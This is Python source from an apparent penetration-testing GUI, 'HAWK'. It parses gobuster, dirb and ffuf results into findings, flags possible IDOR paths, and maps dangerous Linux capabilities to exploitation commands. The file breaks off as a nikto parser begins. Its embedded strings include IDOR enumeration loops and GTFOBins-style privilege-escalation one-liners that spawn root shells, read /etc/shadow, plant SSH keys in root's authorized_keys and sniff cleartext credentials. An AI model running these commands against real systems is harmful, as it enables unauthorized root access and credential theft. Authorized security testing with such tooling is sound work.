# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Kill Chain Card Widget v1.0
- Port-aware routing for all tools
- Hydra: wordlist dropdown from metasploit/seclists + browse
- MSF card: check DB + guide user
- Nmap custom: free command field
- Right-click context menu on all entries
- smbclient/crackmapexec → auto-populate intel
- ssh_banner/ftp_anon port-aware fix
- No popup for 0 ports found
- WinRM excluded from HTTP tools
"""

import customtkinter as ctk
import tkinter as tk
import os
import re
import glob
import time
import subprocess
import threading
import shlex
import json
import zipfile
import tempfile
import shutil
import socket
import random
import string
import uuid
from datetime import datetime
from pathlib import Path

from utils.runner import ToolRunner, MultiRunner, MetasploitRunner, GreenBoneRunner
from utils.session import Credential
from gui.widgets.card_common import *

class CardWebParserMixin:
    def _parse_gobuster_to_intel(self, tool, log: list,
                                 returncode: int = 0) -> bool:
        """Parse gobuster / dirb / ffuf output into a structured Target
        Intel finding.

        ``returncode`` is the tool's exit code (STOP / stale-session runs
        are already short-circuited upstream, so a non-zero value here is
        a genuine tool failure).  It gates the empty-result branch: a
        failed run that produced no path rows must not be reported as a
        clean "0 paths found".

        Gobuster:    /admin                (Status: 200) [Size: 1234]
        Dirb:        + http://target/admin (CODE:200|SIZE:1234)
                     ==> DIRECTORY: http://target/backup/
        Ffuf:        admin       [Status: 200, Size: 1234, Words: 12, ...]
                       (path has no leading slash in ffuf — we add it)

        We extract all discovered paths, group by status code, and create
        one readable intel finding.  Same finding shape for every tool
        so the Hydra path-picker and SQLMap URL chooser can reuse them.
        """
        import re
        target = self._get_target() or "target"

        # Gobuster format.  Two variants in the wild:
        #   classic:   /admin        (Status: 200) [Size: 1234]
        #   modern:    admin         (Status: 200) [Size: 1234]   ← no leading /
        # We accept both and normalise to "/admin" further down so the
        # Hydra path-picker + intel finding use a consistent form.
        #
        # First char must be a real path-component character — NOT `#`
        # (wordlist comments), `*`, `(`, etc. — otherwise lines like
        #     # license, visit http://... (Status: 400) [Size: 11]
        # get picked up as fake "/# license" hits.
        GB_RE = re.compile(
            r"^/?([A-Za-z0-9._~\-%][^\s]*)\s+"
            r"\(Status:\s*(\d+)\)\s*\[Size:\s*(\d+)\]")
        # Dirb format: + URL (CODE:NNN|SIZE:NNN) or ==> DIRECTORY: URL
        DIRB_LINE_RE = re.compile(
            r"^\+\s+(\S+)\s+\(CODE:(\d+)\|SIZE:(\d+)\)")
        DIRB_DIR_RE = re.compile(
            r"^==>\s+DIRECTORY:\s+(\S+)")
        # Ffuf default stdout format:
        #   admin                   [Status: 200, Size: 1234, Words: 12, ...]
        # The word (no leading /) is the wordlist entry; we prepend `/`
        # so every finding across tools uses the same path convention.
        FFUF_RE = re.compile(
            r"^(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+)")

        # ── VHOST mode detection ────────────────────────────────────────
        # ffuf v2 prints its config in the banner (first ~30 lines):
        #   :: Header           : Host: FUZZ.silentium.htb
        # When that header is present the wordlist hits are vhost names,
        # not paths — different finding shape, different source tag,
        # different downstream behaviour.  We sniff the banner and keep
        # the parsed domain for use further down.
        VHOST_HDR_RE = re.compile(
            r"Host:\s*FUZZ\.([A-Za-z0-9._\-]+)", re.IGNORECASE)
        vhost_mode = False
        vhost_domain = ""
        for _, raw in log[:80]:
            line = self._strip_ansi(raw)
            m_v = VHOST_HDR_RE.search(line)
            if m_v:
                vhost_mode = True
                vhost_domain = m_v.group(1).strip().rstrip(".")
                break

        entries = []  # list of (path-or-vhost, status, size)
        seen    = set()
        # Noise filter: dir-bruteforcers should NEVER treat 400 Bad
        # Request as a discovery hit.  The status means the server
        # rejected the URL itself — usually because the wordlist
        # contains entries with characters that get URL-encoded into
        # malformed paths (e.g. wordlist "Aston Martin" → encoded
        # "Aston%20Martin" + `-x aspx` produces "%20.aspx" patterns
        # IIS refuses with size 11).  Without this filter, a wordlist
        # with a few hundred such entries blows up the finding to
        # "Found 825 path(s)" of pure garbage on a target with maybe
        # 2 real hits.  We keep a count + samples to surface in the
        # description so the operator sees why the run looked huge.
        # Status 200/204/301/302/307/401/403/405 stay (real discovery
        # signals); 400/404/500 are dropped (404/500 normally aren't
        # printed by gobuster/ffuf/dirb defaults but we filter defensively).
        NOISE_STATUSES = {400, 404, 500}
        noise_filtered = []  # list of (path, status, size) — only sampled
        noise_count = 0

        def _record_entry(item, status, size):
            nonlocal noise_count
            if status in NOISE_STATUSES:
                noise_count += 1
                if len(noise_filtered) < 6:
                    noise_filtered.append((item, status, size))
                return
            key = (item, status)
            if key in seen:
                return
            seen.add(key)
            entries.append((item, status, size))

        for _, raw in log:
            line = self._strip_ansi(raw).strip()
            if not line:
                continue
            m = GB_RE.match(line)
            if m:
                word = m.group(1)
                # Normalise to leading-slash form regardless of gobuster
                # version (old prints "/admin", new prints "admin").
                path = word if word.startswith("/") else "/" + word
                _record_entry(path, int(m.group(2)), int(m.group(3)))
                continue
            m = DIRB_LINE_RE.match(line)
            if m:
                from urllib.parse import urlparse
                path = urlparse(m.group(1)).path or m.group(1)
                _record_entry(path, int(m.group(2)), int(m.group(3)))
                continue
            m = DIRB_DIR_RE.match(line)
            if m:
                from urllib.parse import urlparse
                path = urlparse(m.group(1)).path or m.group(1)
                _record_entry(path, 301, 0)
                continue
            m = FFUF_RE.match(line)
            if m:
                word = m.group(1)
                if vhost_mode:
                    # In vhost mode the wordlist entry is a hostname
                    # label (e.g. "dev", "staging") — keep it as-is, no
                    # leading slash, the rendering path treats it
                    # specifically.
                    item = word
                else:
                    # FFUF without --scheme prints the bare wordlist
                    # entry. Prepend `/` to match gobuster/dirb.
                    item = word if word.startswith("/") else "/" + word
                _record_entry(item, int(m.group(2)), int(m.group(3)))
                continue

        # ── VHOST mode rendering ────────────────────────────────────────
        # Distinct title, source ("ffuf-vhost" matches _SKIP_MSF_SOURCES
        # in target_intel_render so the bogus EXPLOIT WITH MSF button
        # never appears for vhost lists), and description shape.
        # Persistence to discovered_web_paths is skipped — vhost names
        # aren't paths and the Hydra/SQLMap path-pickers should not
        # auto-suggest them as URL targets.
        if vhost_mode:
            dom = vhost_domain or "target"
            title = f"{tool.name} vhost discovery on {dom}"
            if not entries:
                desc = (
                    f"0 vhosts found on {dom}.\n\n"
                    f"Possible reasons:\n"
                    f"  • the IP only serves one site (no Host-based "
                    f"routing)\n"
                    f"  • wordlist too small — try the 110000 list or "
                    f"dns-Jhaddix.txt\n"
                    f"  • response size of unknown vhosts equals the "
                    f"home — set -fs <default_size> or use -ac\n\n"
                    f"What to try next:\n"
                    f"  • DNS subdomain scan (real public DNS only):\n"
                    f"      gobuster dns --domain {dom} -w "
                    f"/usr/share/seclists/Discovery/DNS/"
                    f"subdomains-top1million-5000.txt\n"
                    f"  • Probe a candidate manually:\n"
                    f"      curl -sI -H 'Host: dev.{dom}' "
                    f"http://<target-ip>/")
                self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
                    title=title, description=desc,
                    severity="info", source="ffuf-vhost", replace=True))
                self.app.terminal.write(
                    f"  [*] {tool.name} — 0 vhosts on {dom}.", "dim")
                return True

            by_status_v = {}
            for vh, status, size in entries:
                by_status_v.setdefault(status, []).append((vh, size))

            parts = [f"Discovered {len(entries)} vhost(s) on {dom}:\n"]
            STATUS_ORDER = [200, 301, 302, 307, 401, 403]
            shown_v = set()
            for code in STATUS_ORDER:
                if code in by_status_v:
                    shown_v.add(code)
                    items = by_status_v[code]
                    label = {200: "OK", 301: "Redirect", 302: "Redirect",
                             307: "Redirect", 401: "Auth Required",
                             403: "Forbidden"}.get(code, str(code))
                    parts.append(f"  [{code} {label}] ({len(items)} items):")
                    for vh, size in items[:20]:
                        sz = f"  ({size}B)" if size > 0 else ""
                        parts.append(f"    {vh}.{dom}{sz}")
                    if len(items) > 20:
                        parts.append(f"    ... and {len(items) - 20} more")
            for code in sorted(by_status_v.keys()):
                if code in shown_v:
                    continue
                items = by_status_v[code]
                parts.append(f"  [{code}] ({len(items)} items):")
                for vh, size in items[:10]:
                    sz = f"  ({size}B)" if size > 0 else ""
                    parts.append(f"    {vh}.{dom}{sz}")
                if len(items) > 10:
                    parts.append(f"    ... and {len(items) - 10} more")

            parts.append("")
            parts.append("Next step:")
            parts.append(
                "  Add the discovered vhosts to /etc/hosts (HAWK has an")
            parts.append(
                "  ADD HOSTS dialog), then re-run ffuf in path mode")
            parts.append(
                "  against the most interesting vhost to enumerate")
            parts.append(
                "  directories.")

            severity = "medium" if entries else "info"
            self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
                title=title, description="\n".join(parts),
                severity=severity, source="ffuf-vhost", replace=True))
            self.app.terminal.write(
                f"  [+] {tool.name} — {len(entries)} vhost(s) on {dom} "
                f"added to Target Intel.", "success")
            return True

        if not entries:
            # A non-zero exit with no hits means the run FAILED — the tool
            # aborted (connect: no route to host, wildcard bail-out, missing
            # wordlist) and never tested anything.  Reporting that as
            # "0 paths found — target really has no content" sells a failure
            # as a clean empty scan.  Say it failed and add no finding;
            # _on_done already printed the exit code + reason.  (STOP and
            # stale-session runs are short-circuited before the parser, so
            # this code path only sees genuine tool failures.)
            if returncode != 0:
                self.app.terminal.write(
                    f"  [!] {tool.name} produced no scan data — the run "
                    f"failed (exit {returncode}); no requests completed. "
                    "Not recording an empty-result finding.", "warn")
                return True

            # Zero paths found — produce a clear "empty" finding instead
            # of returning False (which would let the generic output
            # parser dump the gobuster banner into Target Intel).
            target = self._get_target() or "target"
            noise_line = ""
            if noise_count:
                samples_dd = [p for p, st, _ in noise_filtered
                              if st == 400 and ".." in p]
                ex = ("  examples: " + ", ".join(samples_dd[:3]) + "\n"
                      if samples_dd else "")
                noise_line = (
                    f"\nFiltered out {noise_count} noise response(s) "
                    f"(HTTP 400/404/500 — server-side rejections, "
                    f"NOT real paths).\n"
                    f"{ex}"
                    "  → Most common cause: wordlist entry ending "
                    "in `.` + `-x aspx` → `..aspx` patterns IIS "
                    "rejects with 400.  Use raft-medium-directories"
                    ".txt and `-x aspx,config,bak` (no leading dot).\n"
                )
            desc = (
                "0 paths found.\n"
                f"{noise_line}"
                "\n"
                "Possible reasons:\n"
                "  • target really has no content at the web root\n"
                "  • wordlist was too small / mismatched for this stack\n"
                "  • server returned the same response to every request\n"
                "    (a common sign is sizes all matching the default page —\n"
                "     e.g. 689B on fresh IIS)\n"
                "\n"
                "What to try next:\n"
                "  • raft-medium-directories.txt + -x aspx,config,bak\n"
                "      (or php,html,bak on Apache/nginx)\n"
                "  • vhost enum:  ffuf -H 'Host: FUZZ.<target>' "
                "-w subdomains.txt -fs <default_size>\n"
                "  • feroxbuster (recursive) to catch nested directories\n"
                "  • inspect the site manually — view source, robots.txt,\n"
                "    sitemap.xml, /.git/config"
            )
            web_label = self._extract_web_target_label(tool)
            # Stable title (no count) so reruns merge into one row.
            # Count + details live in the description.
            title = f"{tool.name} on {web_label}"
            self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
                title=title, description=desc,
                severity="info", source=tool.name, replace=True))
            self.app.terminal.write(
                f"  [*] {tool.name} — no paths matched. "
                "See Target Intel for next-step suggestions.", "dim")
            return True

        # Persist interesting paths so downstream tools (Hydra HTTP-GET,
        # SQLMap, ...) can pre-populate their "target path" pickers.
        # Skip the noise codes (400, 404, 500) — we only want the paths
        # that actually exist or are protected/auth-gated.
        try:
            sess = self.app.session_manager.current
            if sess is not None:
                keep = [{"path": p, "status": s, "size": sz}
                        for p, s, sz in entries
                        if s in (200, 301, 302, 307, 401, 403)]
                if keep:
                    sess.add_discovered_web_paths(keep)
        except Exception as e:
            print(f"[HAWK] save discovered_web_paths failed: {e}")

        # Group by status code for readability
        by_status = {}
        for path, status, size in entries:
            by_status.setdefault(status, []).append((path, size))

        # Build description
        parts = []
        parts.append(f"Discovered {len(entries)} paths/files:\n")

        # Interesting paths first (200, 301, 302, 401, 403)
        STATUS_ORDER = [200, 301, 302, 307, 401, 403]
        shown_codes = set()
        for code in STATUS_ORDER:
            if code in by_status:
                shown_codes.add(code)
                items = by_status[code]
                label = {200: "OK", 301: "Redirect", 302: "Redirect",
                         307: "Redirect", 401: "Auth Required",
                         403: "Forbidden"}.get(code, str(code))
                parts.append(f"  [{code} {label}] ({len(items)} items):")
                for path, size in items[:15]:
                    sz = f"  ({size}B)" if size > 0 else ""
                    parts.append(f"    {path}{sz}")
                if len(items) > 15:
                    parts.append(f"    ... and {len(items) - 15} more")
        # Any remaining status codes
        for code in sorted(by_status.keys()):
            if code not in shown_codes:
                items = by_status[code]
                parts.append(f"  [{code}] ({len(items)} items):")
                for path, size in items[:10]:
                    sz = f"  ({size}B)" if size > 0 else ""
                    parts.append(f"    {path}{sz}")
                if len(items) > 10:
                    parts.append(f"    ... and {len(items) - 10} more")

        # Highlight interesting findings
        interesting = [p for p, s, _ in entries if s == 200 and any(
            kw in p.lower() for kw in [
                "admin", "backup", "config", "upload", "login",
                "dashboard", "console", "phpmyadmin", "wp-admin",
                "shell", "api", "debug", "test", ".git", ".env",
                "manager", "install", "setup", "cgi-bin"])]
        if interesting:
            parts.append(f"\n★ Interesting (200 OK):")
            for p in interesting[:10]:
                parts.append(f"    {p}")

        # ── IDOR detection: sequential numeric IDs in paths ──────
        import re as _re_idor
        idor_paths = []
        IDOR_RE = _re_idor.compile(r'^(/[^?#]*?)(\d+)$')
        prefix_map = {}  # prefix → list of (num, full_path)
        for path, status, _ in entries:
            if status not in (200, 301, 302, 307):
                continue
            m = IDOR_RE.match(path)
            if m:
                prefix = m.group(1)
                num = int(m.group(2))
                prefix_map.setdefault(prefix, []).append((num, path))
        for prefix, items in prefix_map.items():
            if len(items) < 2:
                continue
            nums = sorted(n for n, _ in items)
            consecutive = sum(1 for i in range(1, len(nums))
                              if nums[i] == nums[i - 1] + 1)
            if consecutive >= 1:
                idor_paths.append((prefix, items))
        if idor_paths:
            idor_parts = []
            idor_parts.append(
                "⚠ POSSIBLE IDOR (Insecure Direct Object Reference)\n")
            idor_parts.append(
                "WHAT IS IDOR?\n"
                "  The server uses predictable, sequential IDs in the URL "
                "to identify resources (users, files, records). If there is "
                "no proper access control, you can simply change the number "
                "to access OTHER users' data.\n")
            idor_parts.append("DETECTED SEQUENTIAL PATHS:")
            for prefix, items in idor_paths:
                paths_str = ", ".join(p for _, p in sorted(items)[:8])
                idor_parts.append(f"  {paths_str}")
            idor_parts.append(
                "\nHOW TO EXPLOIT:\n"
                "  1. Open the lowest-numbered path in your browser:\n"
                "       curl http://TARGET{path}\n"
                "     Look at the response — does it contain user data, "
                "files, or sensitive info?\n\n"
                "  2. Try IDs outside the range you found. If /data/1 "
                "exists, try /data/0, /data/100, /data/999:\n"
                "       for i in $(seq 0 100); do\n"
                "         curl -s -o /dev/null -w \"%{{http_code}} %{{size_download}}\\n\""
                " http://TARGET{prefix}$i\n"
                "       done\n"
                "     Different response sizes = different content = "
                "you are accessing other users' resources.\n\n"
                "  3. Log in as user A, visit /data/1. Note your data. "
                "Now change the URL to /data/2 — if you see user B's "
                "data, that confirms the IDOR.\n\n"
                "  4. In Burp Suite:\n"
                "     • Intercept the request → Send to Intruder\n"
                "     • Mark the ID number as payload position\n"
                "     • Payload type: Numbers (from 0, to 1000, step 1)\n"
                "     • Sort results by response length — different lengths "
                "mean different content\n\n"
                "WHY IS THIS DANGEROUS?\n"
                "  • An attacker can download ALL user data by iterating IDs\n"
                "  • Often used to steal files, view private profiles, "
                "download confidential documents\n"
                "  • One of the OWASP Top 10 (Broken Access Control — A01:2021)"
            )
            parts.append("\n" + "\n".join(idor_parts))

        # ── Interpretation: turn raw counts into actionable notes ──
        # These are the same heuristics a human operator applies when
        # reading gobuster output — codifying them here saves the user
        # from having to eyeball the raw list.
        notes = []

        # IIS default page detection (size 689 is the classic iisstart.htm)
        ok_200 = by_status.get(200, [])
        sizes_200 = {sz for _, sz in ok_200}
        paths_200 = [p.lower() for p, _ in ok_200]
        iis_hit  = any("iisstart" in p for p in paths_200)
        # Default IIS welcome page has a very consistent 689-byte size on
        # fresh Win2008/2012/2016 installs — multiple 200s all at 689
        # bytes almost certainly means "server is up but nothing is
        # actually served".
        all_same_tiny = (len(sizes_200) == 1 and 689 in sizes_200
                         and len(ok_200) >= 2)
        if iis_hit or all_same_tiny:
            notes.append(
                "• IIS default welcome page detected (iisstart.htm). "
                "The web root has no real app — this is a freshly "
                "installed Windows Server with IIS enabled but no "
                "site deployed.")
            notes.append(
                "  → Next: try IIS-specific tools:\n"
                "      nmap --script http-iis-short-name-brute -p80,443 <target>\n"
                "      feroxbuster -u http://<target> -w <wordlist> "
                "-x aspx,asmx,ashx,config,bak\n"
                "      Look for hidden virtual dirs / vhosts via Host "
                "header fuzzing.")

        # Noise advisory: many 400/404/500 lines were filtered out
        # before grouping, because they are never real discovery hits.
        # The most common cause on Windows/IIS is the "trailing-dot +
        # extension" wordlist bug — entries like `please.` plus `-x
        # aspx` become `please..aspx`, which IIS rejects with 400.
        # Tell the operator so a finding labelled "Found 14 paths"
        # doesn't look suspicious next to a terminal that scrolled
        # hundreds of 400-lines past.
        if noise_count >= 5:
            samples_dd = [p for p, st, _sz in noise_filtered
                          if st == 400 and ".." in p]
            sample_txt = ""
            if samples_dd:
                sample_txt = (f"  examples: "
                              + ", ".join(samples_dd[:3]) + "\n")
            notes.append(
                f"• Filtered out {noise_count} noise response(s) "
                f"(HTTP 400/404/500) before counting hits.  These are "
                f"server-side rejections of malformed URLs, not real "
                f"paths.")
            if samples_dd:
                notes.append("  " + sample_txt.rstrip())
            notes.append(
                "  → Common cause: wordlist entry ending in `.` plus "
                "`-x aspx` produces `..aspx` patterns IIS rejects with "
                "400.  Switch to a clean list (raft-medium-directories"
                ".txt, dirb/common.txt) and drop the leading dot in "
                "`-x`:  `-x aspx,config,bak`.")

        # Very few 200s (or only defaults) + no auth gates → probably
        # a blank IIS, suggest vhost/subdomain discovery.
        real_200s = [p for p, sz in ok_200
                     if "iisstart" not in p.lower() and p not in ("/", "")]
        if not real_200s and not interesting and (iis_hit or all_same_tiny):
            notes.append(
                "• No content-bearing paths found beyond the IIS default. "
                "The real app may live under a different hostname — try "
                "vhost/subdomain enumeration:\n"
                "      ffuf -u http://<target>/ -H 'Host: FUZZ.<target>' "
                "-w subdomains.txt -fs 689")

        if notes:
            parts.append("\n— Notes —")
            parts.extend(notes)

        desc = "\n".join(parts)

        # Severity: 200-OK on admin/backup/config paths = medium,
        # otherwise info
        severity = "info"
        if interesting:
            severity = "medium"
        if any(kw in desc.lower() for kw in
               [".git", ".env", "shell", "upload", "phpmyadmin"]):
            severity = "high"

        web_label = self._extract_web_target_label(tool)
        # Stable title (no count) so reruns merge into one row.  The
        # discovered count + grouped paths live in the description and
        # show in the row preview.
        title = f"{tool.name} on {web_label}"

        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description=desc,
            severity=severity, source=tool.name, replace=True))

        self.app.terminal.write(
            f"  [+] {tool.name} — {len(entries)} paths added to "
            f"Target Intel.", "success")
        return True

    def _parse_capabilities_to_intel(self, tool, log: list) -> bool:
        """Parse `getcap -r /` output and flag dangerous capability+binary
        combos with GTFOBins-style exploitation commands."""
        import re

        CAP_RE = re.compile(
            r"^(\S+)\s.*?(cap_\w+(?:,cap_\w+)*)[+=]", re.I)

        DANGEROUS_CAPS = {
            "cap_setuid": {
                "risk": "HIGH",
                "why": (
                    "This capability lets the program change its user ID "
                    "to ANY user — including root (UID 0). If the binary "
                    "allows running commands or loading scripts, you can "
                    "become root instantly."),
            },
            "cap_setgid": {
                "risk": "HIGH",
                "why": (
                    "This capability lets the program change its group ID "
                    "to ANY group — including root/shadow. You can read "
                    "/etc/shadow (password hashes) or access root-only files."),
            },
            "cap_dac_override": {
                "risk": "CRITICAL",
                "why": (
                    "This capability IGNORES all file permission checks. "
                    "The binary can read/write ANY file on the system — "
                    "/etc/shadow, /etc/passwd, /root/.ssh/authorized_keys, "
                    "anything. This is essentially root-level file access."),
            },
            "cap_dac_read_search": {
                "risk": "HIGH",
                "why": (
                    "This capability bypasses read/search permission checks. "
                    "The binary can read ANY file and list ANY directory. "
                    "You can read /etc/shadow, SSH keys, config files."),
            },
            "cap_net_raw": {
                "risk": "MEDIUM",
                "why": (
                    "This capability allows raw socket access — the binary "
                    "can sniff network traffic (like tcpdump/Wireshark). "
                    "Use it to capture credentials sent in cleartext "
                    "(FTP, Telnet, HTTP basic auth)."),
            },
            "cap_net_bind_service": {
                "risk": "LOW",
                "why": (
                    "Allows binding to privileged ports (<1024). Not a "
                    "direct privesc but can be used for phishing/MITM by "
                    "impersonating legitimate services."),
            },
            "cap_sys_admin": {
                "risk": "CRITICAL",
                "why": (
                    "This is the most dangerous capability — it grants "
                    "a wide range of admin operations including mounting "
                    "filesystems, loading kernel modules, and more. "
                    "Almost always leads to full root."),
            },
            "cap_sys_ptrace": {
                "risk": "HIGH",
                "why": (
                    "This capability allows tracing/debugging ANY process. "
                    "You can inject code into running processes owned by "
                    "root, read their memory, or hijack them."),
            },
            "cap_fowner": {
                "risk": "HIGH",
                "why": (
                    "This capability bypasses ownership checks on files. "
                    "The binary can change permissions on files owned by "
                    "root or other users — including /etc/passwd."),
            },
            "cap_chown": {
                "risk": "HIGH",
                "why": (
                    "This capability allows changing file ownership. "
                    "You can take ownership of /etc/shadow or SSH keys "
                    "and then read/modify them."),
            },
        }

        EXPLOIT_DB = {
            "python": {
                "cap_setuid": (
                    "  # Python with cap_setuid — instant root shell:\n"
                    "  {binary} -c 'import os; os.setuid(0); "
                    "os.system(\"/bin/bash\")'\n"
                    "\n"
                    "  WHAT THIS DOES:\n"
                    "    os.setuid(0)  → changes your user ID to 0 (root)\n"
                    "    os.system(\"/bin/bash\") → opens a root shell\n"
                    "  After running this, type 'whoami' — it should say 'root'."),
                "cap_dac_override": (
                    "  # Python with cap_dac_override — read any file:\n"
                    "  {binary} -c 'print(open(\"/etc/shadow\").read())'\n"
                    "\n"
                    "  # Write your SSH key to root's authorized_keys:\n"
                    "  {binary} -c 'open(\"/root/.ssh/authorized_keys\",\"w\")"
                    ".write(\"ssh-rsa YOUR_KEY\")'\n"
                    "  ssh root@TARGET"),
                "cap_dac_read_search": (
                    "  # Python with cap_dac_read_search — read any file:\n"
                    "  {binary} -c 'print(open(\"/etc/shadow\").read())'\n"
                    "  # Then crack the hashes offline with hashcat/john."),
            },
            "perl": {
                "cap_setuid": (
                    "  # Perl with cap_setuid — instant root shell:\n"
                    "  {binary} -e 'use POSIX qw(setuid); "
                    "POSIX::setuid(0); exec \"/bin/bash\";'\n"
                    "\n"
                    "  WHAT THIS DOES:\n"
                    "    setuid(0) → become root\n"
                    "    exec \"/bin/bash\" → spawn a root shell"),
            },
            "ruby": {
                "cap_setuid": (
                    "  # Ruby with cap_setuid — instant root shell:\n"
                    "  {binary} -e 'Process::Sys.setuid(0); "
                    "exec \"/bin/bash\"'\n"),
            },
            "node": {
                "cap_setuid": (
                    "  # Node.js with cap_setuid — instant root shell:\n"
                    "  {binary} -e 'process.setuid(0); "
                    "require(\"child_process\").spawn(\"/bin/bash\","
                    "{{stdio:[0,1,2]}})'\n"),
            },
            "php": {
                "cap_setuid": (
                    "  # PHP with cap_setuid — root shell:\n"
                    "  {binary} -r 'posix_setuid(0); "
                    "system(\"/bin/bash\");'\n"),
                "cap_dac_override": (
                    "  # PHP with cap_dac_override — read any file:\n"
                    "  {binary} -r 'echo file_get_contents(\"/etc/shadow\");'\n"),
            },
            "gdb": {
                "cap_setuid": (
                    "  # GDB with cap_setuid — root shell via Python in GDB:\n"
                    "  {binary} -nx -ex 'python import os; os.setuid(0)' "
                    "-ex '!bash' -ex quit\n"),
                "cap_sys_ptrace": (
                    "  # GDB with cap_sys_ptrace — inject into root process:\n"
                    "  # Find a root-owned process:\n"
                    "  ps aux | grep root\n"
                    "  # Attach and inject:\n"
                    "  {binary} -p <ROOT_PID>\n"
                    "  (gdb) call (void)system(\"/bin/bash\")\n"),
            },
            "vim": {
                "cap_setuid": (
                    "  # Vim with cap_setuid — root shell:\n"
                    "  {binary} -c ':py3 import os; os.setuid(0); "
                    "os.execl(\"/bin/bash\",\"bash\")'\n"),
            },
            "tar": {
                "cap_dac_read_search": (
                    "  # Tar with cap_dac_read_search — read any file:\n"
                    "  {binary} czf /tmp/shadow.tar.gz /etc/shadow\n"
                    "  tar xzf /tmp/shadow.tar.gz -C /tmp/\n"
                    "  cat /tmp/etc/shadow\n"),
            },
            "openssl": {
                "cap_setuid": (
                    "  # OpenSSL with cap_setuid — limited, but can read files:\n"
                    "  {binary} req -x509 -newkey rsa -keyout /dev/null "
                    "-out /dev/null -batch 2>/dev/null\n"
                    "  # Usually not directly exploitable for shell."),
            },
            "tcpdump": {
                "cap_net_raw": (
                    "  # Tcpdump with cap_net_raw — sniff credentials:\n"
                    "  {binary} -i any -A -s 0 'port 21 or port 23 "
                    "or port 80 or port 110 or port 143'\n"
                    "\n"
                    "  WHAT THIS DOES:\n"
                    "    -i any    → listen on all network interfaces\n"
                    "    -A        → print packet contents in ASCII "
                    "(so you can read passwords)\n"
                    "    port 21   → FTP (sends passwords in cleartext)\n"
                    "    port 23   → Telnet (sends everything in cleartext)\n"
                    "    port 80   → HTTP (basic auth, form POSTs)\n"
                    "  Watch the output for USER/PASS lines."),
            },
        }

        findings = []  # list of (binary, caps_list, risk, details)
        for _, raw in log:
            line = self._strip_ansi(raw).strip()
            if not line:
                continue
            m = CAP_RE.match(line)
            if not m:
                continue
            binary_path = m.group(1)
            caps_str = m.group(2).lower()
            caps = [c.strip() for c in caps_str.split(",")]
            binary_name = binary_path.rsplit("/", 1)[-1]

            for cap in caps:
                cap_info = DANGEROUS_CAPS.get(cap)
                if not cap_info:
                    continue
                base_name = binary_name
                for key in EXPLOIT_DB:
                    if key in binary_name.lower():
                        base_name = key
                        break
                exploit = ""
                if base_name in EXPLOIT_DB and cap in EXPLOIT_DB[base_name]:
                    exploit = EXPLOIT_DB[base_name][cap].format(
                        binary=binary_path)
                findings.append({
                    "binary": binary_path,
                    "binary_name": binary_name,
                    "cap": cap,
                    "risk": cap_info["risk"],
                    "why": cap_info["why"],
                    "exploit": exploit,
                })

        if not findings:
            target = self._get_target() or "target"
            desc = (
                "No dangerous Linux capabilities found.\n\n"
                "This means no binaries have special kernel permissions "
                "that could be abused for privilege escalation via "
                "capabilities. Try other privesc vectors:\n"
                "  • sudo -l (check sudo permissions)\n"
                "  • find / -perm -u=s (check SUID binaries)\n"
                "  • Check crontab for writable scripts\n"
                "  • LinPEAS / LSE for automated enumeration"
            )
            self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
                title=f"Capabilities — clean on {self._get_target() or 'target'}",
                description=desc, severity="info", source=tool.name))
            return True

        risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        findings.sort(key=lambda f: risk_order.get(f["risk"], 99))
        top_risk = findings[0]["risk"]

        parts = []
        parts.append(
            f"Found {len(findings)} dangerous capability assignment(s)!\n")
        parts.append(
            "WHAT ARE LINUX CAPABILITIES?\n"
            "  Linux capabilities split root's powers into small pieces. "
            "Instead of making a binary fully SUID-root, admins can give "
            "it just ONE specific root power (e.g. 'change user ID' or "
            "'read any file'). BUT if the binary also lets you run "
            "commands (like python or perl), you can ABUSE that power "
            "to become root.\n")

        for f in findings:
            parts.append(f"{'─' * 60}")
            parts.append(
                f"  BINARY:     {f['binary']}\n"
                f"  CAPABILITY: {f['cap']}\n"
                f"  RISK:       {f['risk']}")
            parts.append(f"\n  WHY IS THIS DANGEROUS?\n  {f['why']}")
            if f["exploit"]:
                parts.append(f"\n  EXPLOITATION COMMANDS:\n{f['exploit']}")
            else:
                parts.append(
                    f"\n  No known automated exploit for {f['binary_name']} "
                    f"+ {f['cap']}.\n"
                    f"  Check GTFOBins: https://gtfobins.github.io/gtfobins/"
                    f"{f['binary_name']}/#capabilities\n"
                    f"  If the binary can run commands or read files, "
                    f"the capability is exploitable.")

        parts.append(f"\n{'─' * 60}")
        parts.append(
            "GENERAL TIPS:\n"
            "  • After getting a root shell, ALWAYS verify with:\n"
            "      whoami && id\n"
            "    You should see 'root' and 'uid=0(root)'\n"
            "  • Grab proof: cat /root/root.txt (for CTFs)\n"
            "  • If no known exploit exists for the binary, check:\n"
            "      https://gtfobins.github.io/\n"
            "    Search for the binary name → look at the 'Capabilities' section"
        )

        desc = "\n".join(parts)
        sev_map = {"CRITICAL": "critical", "HIGH": "high",
                    "MEDIUM": "medium", "LOW": "low"}
        severity = sev_map.get(top_risk, "medium")
        target = self._get_target() or "target"
        title = (f"Capabilities — {len(findings)} dangerous on {target}")

        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description=desc,
            severity=severity, source=tool.name))
        self.app.terminal.write(
            f"  [+] {len(findings)} dangerous capabilities found — "
            f"see Target Intel for exploitation commands.", "success")
        return True

    def _parse_nikto_to_intel(self, tool, log: list) -> bool:
        """Parse nikto output into a structured Target Intel finding.

        Nikto emits a mix of:
          • banner lines  (- Nikto v2.6.0  / + Target IP: ...)  → skip
          • config echo   (Target Hostname, Target Port)         → skip
          • findings      (+ [code] /path: message)              → keep
          • helper hints  ("See: https://developer.mozilla...")  → keep as
                                                                    context
          • end summary   (+ End Time:, + 1 host(s) tested)      → skip

        The trick is the `[code]` bracket — every real finding has a
        4-6 digit numeric code (Nikto's rule ID).  Banner lines don't.
        """
        import re
        target = self._get_target() or "target"

